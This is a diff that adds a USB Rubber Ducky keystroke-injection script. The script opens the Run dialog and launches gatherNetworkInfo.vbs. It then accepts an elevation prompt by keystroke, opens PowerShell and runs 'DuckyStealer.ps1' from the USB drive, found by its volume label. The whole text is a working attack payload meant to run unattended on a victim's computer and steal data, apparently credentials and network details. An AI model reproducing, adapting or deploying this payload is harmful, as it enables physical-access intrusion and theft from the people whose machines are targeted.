@@ -1,0 +1,20 @@
+DELAY 10000
+GUI R
+DELAY 200
+STRING cmd  /C "start gatherNetworkInfo.vbs"  
+DELAY 200
+CTRL-ALT ENTER
+DELAY 100
+LEFTARROW
+DELAY 100
+ENTER
+DELAY 15000
+CTRL ESC
+DELAY 200
+STRING powershell
+DELAY 200
+ENTER
+DELAY 200
+STRING .((gwmi win32_volume -f 'label=''_''').Name+'DuckyStealer.ps1')
+DELAY 200
+ENTER
